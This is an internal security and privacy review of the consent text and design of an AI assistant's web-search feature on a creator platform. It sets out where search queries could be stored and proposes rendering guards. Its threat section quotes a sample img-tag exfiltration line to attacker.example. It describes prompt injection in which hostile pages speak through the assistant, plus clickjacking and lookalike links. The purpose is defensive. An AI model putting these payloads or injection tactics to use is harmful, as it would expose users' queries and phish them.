# Kabir — security and privacy review of the creator web-search consent wording

**From:** Kabir (red team)
**To:** Arjun. Copy: Nisha, Priya, Vikram, Ananya. Escalation: Swapnil (S-3 only, if he wants Clarity left unmasked)
**Date:** 2026-09-20
**Ref:** `T-CREATOR-CREDITS-SEARCH` step 0.4, checker slot
**Tree:** `C:\Users\Sage world\Downloads\New Influora Ai\influora-credits`, branch `feat/creator-credits-search`
**How:** read only. No file under `influora-api/` touched, no `mvn`, no vitest, no pytest. Vikram is building Java in this tree. This file is the only file I created.

**Read:** `NISHA-CONSENT-SEARCH-0920.md`; `PLAN.md` §1, §3 step 5, §4, §6; `CREDITS-SPEC.md` (this task's amended copy) §2.1, §2.2, §4A.1–§4A.4, §10.4; `KABIR-CONSENT-0917.md` (my own v2 conditions); `src/components/meera/ConsentScreen.tsx`; `ConsentScreen.test.tsx`; `src/content/legal/privacy-policy.md`; `influora-api/.../CreatorAgentPreferences.java`; `.../MeeraSessionService.java`; `.../CreatorAgentConversationService.java`; `.../MeeraInteractionLogService.java`; `.../SensitiveTextRedactor.java`; `influora-ai/app/security/redaction.py`; `app/costs/spend_tracker.py`; `app/providers/gemini.py`; `app/providers/claude.py`; `app/auth/consent.py`; `public/site-tags.js`; `index.html`; `docker/nginx.conf.template`; `src/components/ErrorBoundary.tsx`; `src/lib/api.ts`.

---

## Verdict at a glance

| # | Question | Verdict |
|---|---|---|
| 1 | Is her paragraph truthful about where the data goes? | **APPROVE WITH CHANGES** (C-S1, C-S2). The Hindi is faithful to the English — it softens nothing. The English is not faithful to the code. |
| 2 | Is "the question is saved, the results are not" exactly right? | **REJECT.** It is **backwards for the question**. As specified, nothing saves the question with her conversations at all. Three other places it could land are named below. |
| 3 | v2 → v3 with re-consent, or a notice line? | **APPROVE.** v3 + re-consent, as Nisha says. G-1 is restated and now needs a **third** leg (S-1): the feature flag must be chained to the version **in code**, not in a deploy checklist. |
| 4 | Any promise we cannot keep? | **APPROVE WITH CHANGES.** "Skip it" is honest and "on by default" is honest. Two things are not: the missing provider-retention fact (C-S1) and, until S-3 ships, "the results are not saved". |
| 5 | Injection and rendering | **REJECT the plan's current rules.** They state goals with no mechanism. Seven guards below (S-5 … S-8, S-11, S-12 and the CSP note). The Google snippet must **not** reach `dangerouslySetInnerHTML`. |

Overall: the wording is close, and Nisha caught the thing the plan had wrong. But her fix inherits a second wrong fact from the same sentence, and item 5 is not ready to build.

---

## 1. Where the data goes

### 1a. The Hindi is honest. Checked sentence by sentence

Nisha's hi-IN paragraph carries the same four facts as her en-IN paragraph, with nothing added, dropped or softened:

| English | Hindi | Same? |
|---|---|---|
| "your question is sent to Google or another search provider" | "आपका सवाल Google या किसी और search provider को भेजा जाता है" | yes — same actor, same passive, "किसी और" = "some other", not "maybe" |
| "results are shown to you with their sources" | "आपको results उनके sources के साथ दिखाए जाते हैं" | yes |
| "Your question is saved with your conversations, but the search results are not" | "आपका सवाल आपकी conversations के साथ save होता है, लेकिन search results save नहीं होते" | yes — the same claim, and the same error, in both |
| "You can skip web search and still use Meera for deals, payments, and briefs" | "आप web search को skip कर सकते हैं और फिर भी Meera का इस्तेमाल … कर सकते हैं" | yes |

No hedge, no "usually", no dropped actor, no weaker verb. On fidelity, this passes. My C2 precedent stands: Nisha owns the register, I own the facts.

**Register note, not a fact change, Nisha's call.** Her paragraph writes the feature list in Latin ("deals, payments, और briefs") while v2's paragraph 1 writes the same words in Devanagari ("आपके डील्स, पेमेंट, और मेट्रिक्स"). Inside one notice the two read as two authors. "brief" in Latin matches v2's paragraph 3, so only "deals, payments" is inconsistent.

### 1b. The English does not match what the code will do. Three faults

**Fault 1 — "Google or another search provider" mislabels the paid path.** Beyond the free weekly two, the question goes to **Anthropic**, which is not a search provider: it is an AI company that runs a model that runs a search (`PLAN.md` §3 step 5, "Claude search route … `max_uses: 1`"). A creator reading "search provider" does not learn that an AI company received her question and read pages on her behalf. Her "or another search provider" is otherwise a good instinct and I am keeping the open-ended half of it — the router may add Brave later (`PLAN.md` §3 step 5, §6), and a closed list of two would be silently falsified by that switch.

**Fault 2 — no provider-retention fact, and the paragraph sits next to a deletion promise.** v2 paragraph 2 ends "You can export or delete your conversations anytime from Settings." Nisha's new paragraph then attaches the question to "your conversations". A reader joins those two and concludes she can delete her search questions. She cannot delete the copy Google or Anthropic holds, and we have no mechanism to ask for it. This is the exact adjacency I refused for briefs in C1 ("right after 'You can export or delete your conversations anytime from Settings', a reader can take that deletion to cover briefs"), and my own "Not checked" note in `KABIR-CONSENT-0917.md` already ruled on the principle: *"Anthropic's own retention of API inputs. Influora cannot delete those copies, so no notice may promise it."* Same rule, same answer.

Also note what `PLAN.md` step 0.1 actually buys: on the paid Gemini tier "Google does not use the data" is a **use** restriction, not a **retention** restriction. If that line is ever paraphrased into creator copy as "Google doesn't keep it", that is a promise we cannot keep. Step 0.1 must record the exact terms URL and the date read, not the paraphrase.

**Fault 3 — no "don't type it in the first place" warning.** v2 paragraph 3 ends "Before you paste, remove anything you don't want Meera to read." A search box is a *worse* destination than a paste box: it leaves our estate to a third party, and we cannot delete it afterwards. The only control the creator has is not typing it. A brand asking a creator to "search this and send me the result" is a plausible way to get her to type her own bank details into Google. The search paragraph needs the same warning the briefs paragraph got, for a stronger reason.

### C-S1 (required). My replacement fourth paragraph

**en-IN:**

> When you ask Meera to search the web, your question goes to an outside company that runs the search — Google, or another provider we use. Influora does not save your question or the results, and Meera cannot see the results later. That company keeps its own copy of your question and Influora cannot delete it, so don't type anything you don't want an outside company to read. You never have to use web search — Meera works without it.

**hi-IN (draft; Nisha finalises the register, the facts are fixed):**

> जब आप Meera से web search करने के लिए कहते हैं, तो आपका सवाल search चलाने वाली एक बाहरी कंपनी को जाता है — Google, या हम जिस दूसरे provider का इस्तेमाल करते हैं। Influora आपका सवाल या results save नहीं करता, और Meera बाद में वो results नहीं देख सकती। वो कंपनी आपके सवाल की अपनी copy रखती है और Influora उसे delete नहीं कर सकता, इसलिए वो कुछ भी न लिखें जो आप नहीं चाहते कि कोई बाहरी कंपनी पढ़े। web search का इस्तेमाल करना ज़रूरी नहीं है — Meera उसके बिना भी काम करती है।

What changed from Nisha's and why:
- "an outside company that runs the search — Google, or another provider we use" — names Google (it appears in the UI anyway, via the required search-suggestions chips) without calling Anthropic a search provider, and stays true when the router adds Brave.
- "Influora does not save your question or the results" — matches the specified route (item 2). It replaces her inverted claim.
- "That company keeps its own copy … and Influora cannot delete it" — closes fault 2 and kills the deletion inference before it forms.
- "don't type anything you don't want an outside company to read" — closes fault 3; deliberately mirrors paragraph 3's construction so the notice reads as one voice, and the Hindi reuses paragraph 3's exact "जो आप नहीं चाहते कि … पढ़े" shape.
- "You never have to use web search — Meera works without it" — keeps her optionality fact. I dropped "for deals, payments, and briefs" only to buy back length (see S-10 / G-3R); if Nisha wants it back, put it back and re-run the layout proof.

### C-S2 (required for v3). Paragraph 2 must say chat uses an outside AI company

In `KABIR-CONSENT-0917.md` Q2 I marked this **recommended, not required**. For v3 it becomes required, and the reason is new: v3 will name an outside company for **search** while staying silent that every **chat** message already goes to one (`providers/claude.py` builds `AsyncAnthropic` with no `base_url`). In v2 that silence was neutral. Once paragraph 4 names Google, the silence actively teaches the creator that search leaves Influora and chat does not. That is false, and our own new paragraph creates the belief.

This names a category, not a processor, so it matches the privacy policy's existing "Cloud and AI infrastructure providers" and needs no counsel ruling to ship.

**en-IN paragraph 2, first sentence:**
> Meera uses an outside AI company to read your profile data, deal history, payment status, and metrics.

**hi-IN paragraph 2, first sentence:**
> Meera आपके प्रोफाइल डेटा, डील हिस्ट्री, पेमेंट स्टेटस और मेट्रिक्स को पढ़ने के लिए एक बाहरी AI कंपनी का इस्तेमाल करती है।

The second sentence of paragraph 2 ("You can export or delete your conversations anytime from Settings" / the Hindi) is unchanged. Paragraphs 1 and 3 are unchanged.

---

## 2. "The question is saved, the results are not" — REJECT. It is backwards

Nisha corrected the plan in the right direction and then landed one step past the truth. Her §5A reasoning assumes a search question is an ordinary chat message on `POST /creator/meera/send-turn`, persisted to `ai_messages.content`. **The route she is describing the consent for is not that route.**

**What the spec actually builds** (`CREDITS-SPEC.md` §4A.2, `POST /creator/meera/search`): five guards, then `ensureInitialized` → `tryClaimFreeSearch` → `charge` or a `FREE_SEARCH` ledger row → `searchClient.search(creatorUserId, query)` → response. **No `AiMessage` row. No conversation id. No message id anywhere in the route.** §4A.4 then forbids the other direction explicitly: *"the search response must NOT be persisted as an `ai_messages` row and must not be appended to the conversation the assembler reads."*

So as specified, **neither the question nor the result is saved by Influora.** Her sentence promises storage that will not exist.

Over-disclosure is the safe direction and I would normally wave it through. I am not, for three reasons:
1. It sends the creator to `Settings → export/delete` looking for questions that were never stored. A DPDP access request against that sentence returns nothing, and we look like we are hiding something.
2. It anchors "my search questions live in a bucket I control". The moment anything *does* write the query — see the three landing spots below — the wording flips from harmlessly wrong to a broken promise, and nobody re-reads consent copy when adding a `note` field.
3. Data minimisation is the better story and it is already the design. Say it.

C-S1 says "Influora does not save your question or the results". **That is true of the specified route and false today of the rendered page** — S-3.

### The three places a search query can still land. Each needs a gate

**S-2 (required, HIGH if missed). `creator_credit_ledger.note VARCHAR(255) NOT NULL DEFAULT ''`** — `CREDITS-SPEC.md` §2.2, L155. Every search writes a row to this table: `SEARCH_DEBIT`, `SEARCH_REFUND` or `FREE_SEARCH`. Putting the query in `note` is the single most natural thing a builder does next ("so support can see what she searched"), and it is the worst available outcome:
- the ledger is money-like audit data — `CreatorAgentConversationService.deleteConversation` (L107-114) does not touch it, account deletion is a soft delete of `User` and does not touch it either, and there is no delete path by design. Retention is permanent.
- `CREDITS-SPEC.md` §10.4 L1040 renders the **last 50 ledger rows** on `/creator/credits`. Her search questions would appear in her billing history, and in whatever admin view reads the same rows.
- **Required:** `note` is `''` for all three search reasons, and `reference_id` is the `chargeKey`/ULID only. No query text, no truncated query, **and no hash or fingerprint of the query** — a hash still proves she asked a specific thing. One test per reason asserting `note` is empty, and it must go red if a `note` argument is threaded in.

**S-2b (required, forward-invariant). `MeeraInteractionLogService.record(...)`** — its `revisionReason` is the only free-text parameter on the flywheel table, scrubbed by `SensitiveTextRedactor.redact` (PAN / phone / bank / secret / JWT / email regexes only). A query like "how much should I charge Nykaa for 3 reels" survives that scrub completely, and `meera_interaction_log` has **no read query and no delete path** (its own javadoc says write-only). **Required:** the search route never calls `MeeraInteractionLogService`. If flywheel counting is wanted later, pass the event type and counts, never the query.

**S-3 (required, HIGH, and it is the one that falsifies the copy today). Microsoft Clarity session replay records the creator's screen.**
- GTM `GTM-K7LNG26G` loads on **every** route via `<script src="/site-tags.js" defer>` in `index.html` L82, and Clarity (`yh2rsgpkvq`) is a tag **inside that container** (`index.html` L68-70, `public/site-tags.js` L44-58).
- `public/site-tags.js` L4 records the ruling: *"Tags fire for every visitor on every route, with no consent"*, and L91-106 already writes the gap down: Clarity replay covers logged-in `/creator` screens, "Mask sensitive content" is **not** confirmed Strict, and *"money/KYC regions need the `data-clarity-mask=\"true\"` attribute to be masked in the replay image itself"*. Clarity masks input **values** by default; it does **not** mask rendered page text.
- Therefore, with the search card as planned, **Microsoft receives a replay containing the typed question and the full rendered result** — a stored copy of both, held by a company the notice does not name, created by us. That breaks (a) C-S1's "Influora does not save your question or the results", (b) `PLAN.md` step 5's "Nothing is stored; logs record counts only", and (c) Google's own requirement that the grounded result is *never stored* — a session replay of the card is a stored copy of the result, whatever we call it.
- **Required before the search card ships:** `data-clarity-mask="true"` on the search input, the query echo, the answer, the citations and the Google snippet container; and the Clarity dashboard set to Strict, recorded with a date and who checked. If Swapnil would rather leave Clarity unmasked, then the notice has to say an analytics company records her screen — that is his call, not mine, and I do not recommend it.
- The same exposure already applies to today's chat thread and pasted briefs. That is older than search and not this gate, but it is the same fix and it should be one ticket.

**S-4 (required, MEDIUM). Crash reports.** `src/components/ErrorBoundary.tsx` L91-105 POSTs `{message, stack, componentStack}` to `/api/v1/client-errors`, which lands in the VPS logs as `[CLIENT_ERROR_REPORT]`. `componentStack` is component names and `stack` is frames, but `message` is whatever was thrown. A search card that throws `new Error('bad snippet: ' + html)` or lets a `JSON.parse` failure carry the payload ships the query or the result into our server logs. **Required:** no query, answer or snippet text in any thrown `Error` message on the search path. Cheap, and it is a grep away.

### What I checked and found clean

- **`ai_messages` is a real hard delete.** `CreatorAgentConversationService.deleteConversation` L111-114 deletes the messages, the tracking row and the `AiConversation`. So *if* the question were ever written there, "delete your conversations" would genuinely erase it. Not needed under the current design, but it means moving to a saved-question design (below) is safe on the deletion side.
- **`spend_tracker.record_creator_spend`** (L476-502) takes a `Decimal` and a `creator_id`. No text, no query, Redis keys only.
- **Providers log exception types only.** `gemini.py` L267, L309 and `claude.py` L344/L348/L412/L416 log `type(exc).__name__`. `redaction.py` logs shapes, not values.
- **No body-logging filter in Spring**, and `CreatorMeeraController` contains no log calls at all. `MeeraSessionService` logs one WARN with ids only (L657).
- **`app/auth/consent.py`** now accepts only `consent_accepted is True` — my K-4 is closed, and there is no version literal anywhere in `influora-ai/app`, so a v3 bump needs no Python change.

### If Priya would rather keep Nisha's sentence, there is a legitimate second option

Persist the question as an ordinary `MessageRole.USER` `AiMessage` row in the creator's conversation, and only the question. Then "saved with your conversations" is true, `deleteConversation` really erases it, and it appears in the DPDP export. The costs are real: the question re-enters every later prompt through the 40-turn window; two consecutive `user` messages appear in the list that ash's P0-1 work just normalised; and we would be *adding* stored personal data for a copy nobody asked for. **I recommend against it.** Not saving is both cheaper and more defensible. But it is Priya's architecture call, and either way the words and the code must say the same thing.

---

## 3. v3 with re-consent — APPROVE, and G-1 grows a third leg

Nisha is right, and the mechanism is confirmed on this branch: `CreatorAgentPreferences.CURRENT_CONSENT_VERSION = "v2"` (L56) with `isConsentAccepted()` requiring **equality** (L411). A bump to `"v3"` forces every consented creator to re-accept before chat, paste, voice and tools. A search can therefore never run on a pre-v3 consent *as long as the constant is at v3*.

**The four version sites, all confirmed by grep. All four in one commit:**
1. `src/components/meera/ConsentScreen.tsx` L41 — `CONSENT_TEXT_VERSION = 'v2'` → `'v3'`, plus the two bodies.
2. `src/components/meera/ConsentScreen.test.tsx` L53 pin, L70 / L82 exact-equality constants.
3. `influora-api/src/main/java/com/influora/domain/entity/CreatorAgentPreferences.java` L56.
4. `src/lib/api.ts` L6752 — the mock `consent_version: 'v2'`. Miss this one and the `!isApiLive()` branch says "already consented" and nobody in a mocked build ever sees the screen. `src/lib/meera-api.ts` has no consent field, so the two-API-layers rule costs nothing here.

### What breaks in each split — this is the whole answer to the question

| Build | Flag | What happens |
|---|---|---|
| v3 text, backend **v2** | off | Every creator who consented under v2 still reads `consent_accepted: true` and **never sees paragraph 4**. Only never-consented creators see it. Harmless *while the flag is off* — and then someone flips the flag, because a flag flip is an ops action and not a deploy. **Then every search sends a question to Google under a consent that never mentioned it.** This is the breach path, and it is the likely one. |
| backend **v3**, old 3-paragraph text | off | Everyone is forced to re-consent to a notice that does not mention search. The re-consent event is spent for nothing, and turning search on later needs v4 and a *second* forced re-consent. Someone will then "fix" it by editing the text without bumping — which is row 1. |
| v3 text + backend v3 | off | Fine. The copy is conditional ("When you ask Meera to search the web…") so it describes a feature that is not on yet without lying. **This is the recommended sequence: ship the notice and the version together, flip the flag whenever.** |
| any text | **on** with backend v2 | Breach, same as row 1. |

### S-1 (required). Chain the flag to the version in code, not in a checklist

G-1 as written ("text and backend version in the same deploy") does not cover row 4, because the flag is an env var and not part of either. Two lines closes it, in the guard Vikram is already adding:

- `requireSearchEnabled()` (`CREDITS-SPEC.md` §4A.1) must **also** require `CreatorAgentPreferences.CURRENT_CONSENT_VERSION` to be `"v3"` or later, returning the same `404 FEATURE_DISABLED` envelope otherwise. A flag flip on a v2 jar then cannot open the route at all.
- One test: flag on, version constant below v3 → `POST /creator/meera/search` is 404.

**S-1b — proof at deploy (the S-2 shape from my v2 review):** the deployed jar has `CURRENT_CONSENT_VERSION = "v3"`; a v2-stamped test account gets `consent_accepted: false` from `GET /creator/agent-preferences` and sees the **four**-paragraph screen on its first Analyse or first turn; and on a v2 jar with the flag forced on, the search route answers 404.

---

## 4. Promises we cannot keep

**"You can skip web search and still use Meera for everything else" — TRUE, with an invariant to defend it.** Nothing searches on its own: the only entry is `POST /creator/meera/search`, the result is never fed back into chat, and Meera has no search tool. So skipping is real, and "skip" is the honest verb.

- **S-8 (required).** Search must stay creator-initiated. No tool executor registers it, the daily-suggestion route does not call `searchClient`, and no job does. If search ever becomes a tool Meera decides to call, "you never have to use web search" is false and the notice needs another bump. Enforce with a grep gate on `searchClient` call sites plus a test that the creator tool registry contains no search tool.
- One thing the paragraph cannot fix, LOW, no change: **declining this dialog costs her all of Meera**, not just search. That has been true since v1 and was equally true of the briefs paragraph in v2, so I am not reopening it — but nobody should describe Accept/Not-now as a per-feature choice in the UI around it.

**"Do we control whether Google retains the query?" — NO, and C-S1 now says so.** Paid-tier Gemini gives us a *use* restriction, not deletion rights. Anthropic retains API inputs and we cannot delete those copies. C-S1's third sentence is the whole point of the change.

**"Is 'optional' honest given the free weekly searches are on by default?" — YES.** A free slot is only consumed by `tryClaimFreeSearch` inside the route, i.e. only when she asks. The allowance sitting there unused costs her nothing and discloses nothing. "2 free searches left this week" is informational, not a default-on transfer.

**S-9 (required, honesty gap Nisha's §4 labels do not cover).** `CREDITS-SPEC.md` §4A.2 is explicit: a **paid** search that fails is refunded 25 tenths; a **free** search that fails does **not** get its weekly slot back. So the creator on the free tier gets no answer and her counter drops from 2 to 1, while the paying creator gets her credits back. If the failure copy does not say so, she will read it as theft, and she will be right to. Nisha owes one line of copy for that state in both languages, naming the fact plainly rather than letting the counter silently tick down. Also: `free_searches_left` is computed with a read-only lazy roll (§4A.3) while the claim is atomic, so the label can be optimistic — the **response** must say whether that search was free or charged, and the card must show the outcome from the response, never from the pre-click label.

**One non-blocking note on Nisha's §5B/§5C.** Her read of the privacy policy is right and both pre-date search: L44 claims "training … AI features" and nothing in `influora-api` or `influora-ai` trains on user data; L80's "only as long as needed" is contradicted by my own K-1 (pasted briefs are never deleted by any path). Neither is a search blocker. Search adds a **third**, and this one *is* search-adjacent: the privacy policy names no processor for search and, per `site-tags.js` L103-104, names neither Microsoft Clarity nor Google for session recording. Whoever owns the policy pass should take all three together.

---

## 5. Injection and rendering — the plan's rules are not enough

`PLAN.md` §3 step 5 says "Search result text is untrusted: never treated as instructions" and §4 repeats it. That is the goal, not a mechanism. §4A.4 adds that the Google snippet must be *displayed*. Displaying a third party's HTML inside a logged-in creator's session is the highest-risk thing in this whole build, and there is no rule yet saying **how**.

Context that matters: **there is no HTML sanitiser in this repo.** `package.json` has no DOMPurify and no `sanitize-html`. The only `dangerouslySetInnerHTML` uses in `src/` are our own chart CSS (`ui/chart.tsx` L84) and our own JSON-LD (`lib/seo/schema.ts` L270); `api.ts` L3414 already carries the house rule — *"render it as plain text only, never `dangerouslySetInnerHTML`"* — and the admin email preview deliberately uses a `sandbox=""` iframe instead (`EmailComposePage.tsx` L542). Follow the admin precedent, not a new sanitiser.

### S-5 (required). Google's search-suggestions snippet: sandboxed iframe, never innerHTML

`searchEntryPoint.renderedContent` is Google-authored HTML with an inline `<style>` block, anchors, and **chips containing the creator's own query text**.

- **HTML injection / self-XSS.** The snippet echoes the query. A query is not always the creator's own idea — a brand telling her "search this exact phrase and send me the screenshot" is a working delivery vector, and the day search becomes reachable from a brief the text is fully brand-controlled. Self-XSS is still XSS: it runs in her session, with her creator JWT.
- **CSS overlay / clickjacking.** Prod CSP carries `style-src 'self' 'unsafe-inline'` (`docker/nginx.conf.template` L79), so injected CSS runs. Unscoped rules can cover our UI with an Influora-looking panel ("verify your bank details"). No script needed.
- **Exfiltration that CSP cannot stop.** `img-src 'self' data: blob: https:` allows **any** https image. `<img src="https://attacker.example/x?q=…">` leaks the query and her IP on render. This is the one to remember: even with scripts fully blocked, raw-HTML rendering leaks.
- **CSP is a second fuse, not the guard.** Prod `script-src` has **no** `'unsafe-inline'`, so inline `<script>`, `onerror=` handlers and `javascript:` URLs are blocked in production. Two cautions: `vite dev` sends no CSP (an XSS test in dev "works" and proves nothing about prod, and a dev-only test proving safety proves nothing either), and `frame-src` currently lists only Razorpay/GTM/tagassistant — whoever builds the iframe must verify a `srcdoc` frame actually renders under that policy in a **production-CSP** build, not in dev.

**Required:** render the snippet in an iframe with `srcdoc`, `sandbox` **without** `allow-scripts` and **without** `allow-same-origin` (add `allow-popups allow-popups-to-escape-sandbox` so the chips can open, with a fixed height and no `allow-top-navigation`). That satisfies Google's display requirement, contains the CSS, and denies DOM access to our document. Plus: a length cap on the snippet, and **fail closed** — if the snippet is absent or malformed, show no result card at all, because a Gemini result we cannot legally display is a result we must not show. Never `dangerouslySetInnerHTML`, in any variant, with or without a hand-rolled regex "sanitiser".

### S-6 (required). A hostile page's text arriving as an instruction

The Claude path has the model read attacker-controlled pages inside Anthropic's own loop, and returns prose built from them. It cannot reach our tools (no tools on that call, `max_uses: 1`), so the injection cannot *act* — it can only **talk to the creator**, wearing Meera's voice and sitting inside Influora's chrome. "Your Influora payout is on hold, confirm your account at …" is the realistic payload.

**Required:**
- The card is visibly **not Meera**: a fixed, non-dismissible caption on every search card saying this came from the web and Influora has not checked it, plus a line that Influora and Meera never ask for a password, OTP or bank details. Nisha writes it, both languages. Meera's persona must never restate a search result as her own advice.
- The answer body renders as **plain text**. No markdown-to-HTML, no auto-linkifying inside the prose. Links come only from the structured citation list, through S-7.

### S-7 (required). A link that looks like Influora

Google chips and Claude citations both carry URLs, rendered inside an Influora-branded card, to a user base our own support flows have trained to trust Influora links.

**Required, for every URL on the card:**
1. Visible text is the **registrable domain** (eTLD+1), never the page title alone as the only clue to the destination.
2. Scheme allow-list `http`/`https`. Drop everything else.
3. **Any host containing "influora" that is not exactly an Influora domain renders as plain text, not a link**, with a visible "this link claims to be Influora" marker. This is the anti-impersonation guard and it is the cheapest one on the list.
4. Punycode / mixed-script hosts (`xn--`, Cyrillic homoglyphs) are shown in their punycode form and flagged. Never render a decoded lookalike as if it were the real domain.
5. `target="_blank" rel="noopener noreferrer nofollow"` on every one.
6. **No favicons and no images fetched from result domains** — client-side it pixels her IP and the fact she searched; server-side it is an SSRF-by-proxy on our own network.

### S-11 (required). The query never travels in a URL

POST body only, on **both** hops (browser → Spring, Spring → `influora-ai`). No `?q=`, no path segment, no `history.pushState` of the query for deep-linking. A query string lands in nginx access logs, in `Referer` headers on every outbound click from the card, in browser history, and in GA4/GTM page-view parameters (`RouteAnalytics.tsx` L48 pushes the path into `dataLayer` on every navigation). The spec's `POST /creator/meera/search` is right; this is here so the frontend does not undo it.

### S-12 (required). No caching, anywhere, and no second life in a prompt

- Response headers `Cache-Control: no-store` on the search route, and confirm no CDN or nginx layer caches it. Google's "never stored" binds our own HTTP caches too.
- No `localStorage`, `sessionStorage`, IndexedDB or persisted react-query cache for the result. In-memory component state only, dropped on unmount.
- The result never re-enters a prompt. If that ever changes — "explain this result", "search again with context" — it must go through `wrap_untrusted` / `_safe()` first, exactly as my KC-1 and K-3 conditions require for brief-derived fields. Pin it with a test that fails if the search response object reaches the assembler.

**Checker note for step 5:** its "checked by" line already names me for "untrusted results, the Google snippet rendered safely, the rate limit, no query text in logs". S-5 through S-12 are what I will actually check, so build to them rather than discovering them at my review. The new `creator-meera-search` rate-limit bucket (§4A.2, user-keyed) is correctly specified and I have no change to it.

---

## Conditions summary

| Id | Severity | Condition | Owner | Blocks |
|---|---|---|---|---|
| C-S1 | required | New fourth paragraph as written above, both languages | nisha | the v3 text |
| C-S2 | required | Paragraph 2 says Meera uses an outside AI company, both languages | nisha | the v3 text |
| S-1 | HIGH | `requireSearchEnabled()` also requires consent version ≥ v3; test proves 404 on a v2 build with the flag on | vikram | the search route |
| S-1b | HIGH | Deploy proof: v3 in the jar, a v2 account sees the four-paragraph screen, flag-on-v2 answers 404 | meera | going live |
| S-2 | HIGH | `note` is `''` and `reference_id` is the ULID on all three search ledger reasons — no query text, no hash. Test per reason | vikram | the search route |
| S-2b | MEDIUM | The search route never calls `MeeraInteractionLogService` | vikram | the search route |
| S-3 | HIGH | `data-clarity-mask="true"` on the query and the whole result card; Clarity masking confirmed Strict, dated | ananya + meera | **the wording is false without it** |
| S-4 | MEDIUM | No query / answer / snippet text in any thrown `Error` on the search path | ananya | step 6 |
| S-5 | HIGH | Google snippet in a `srcdoc` sandboxed iframe, no `allow-scripts`, no `allow-same-origin`; fail closed; verified under the **prod** CSP | ananya | step 6 |
| S-6 | MEDIUM | Non-dismissible "from the web, not checked by Influora, we never ask for OTP/bank details" caption; answer rendered as plain text | nisha + ananya | step 6 |
| S-7 | HIGH | Link guards 1-6, including the influora-lookalike block | ananya | step 6 |
| S-8 | MEDIUM | Search stays creator-initiated: no tool, no job, grep gate + registry test | vikram | the search route |
| S-9 | required | Copy for the failed-free-search state (the slot is not returned) and the free/paid refund asymmetry; the card reports free-or-charged from the response | nisha + ananya | step 6 |
| S-10 | required | `ConsentScreen.test.tsx` exact-equality constants rebuilt for four paragraphs in both languages, `CONSENT_TEXT_VERSION` pinned to `'v3'`; G-3R layout re-proof at hi-IN 375×553 and 200% text, since the notice grows by a third | ananya | the v3 text |
| S-11 | MEDIUM | Query in POST bodies only, both hops; never in a URL or `pushState` | vikram + ananya | the search route |
| S-12 | MEDIUM | `no-store`, no client persistence, result never re-enters a prompt (test) | vikram + ananya | step 6 |

**Blocks the search build outright:** S-1, S-2, S-3, S-5, S-7. The other conditions block their own step.

---

## Not checked

- Google's and Anthropic's actual retention periods for API inputs. Not in the repo. C-S1 deliberately says only that they keep a copy and we cannot delete it, which is true whatever the period is. Step 0.1 should record the terms URL and date for both.
- Whether Anthropic's web search sub-processes to Brave. Publicly reported, not verifiable from this tree, and the reason C-S1 keeps "another provider we use" open-ended.
- The Clarity dashboard's current masking setting, and whether the GTM container restricts Clarity by page. Both are outside the repo; S-3 asks for the check with a date.
- No `mvn`, no vitest, no pytest, and nothing rendered. S-5's CSP behaviour for a `srcdoc` frame is reasoned from the policy string at `docker/nginx.conf.template` L79, not observed — that is exactly why S-5 asks for the check in a production-CSP build.
- `CreatorMeeraController.java` and the Java side generally were read while Vikram is editing this tree. Line numbers I cite from `influora-api` are as of 2026-09-20 and should be re-grepped on the committed version.
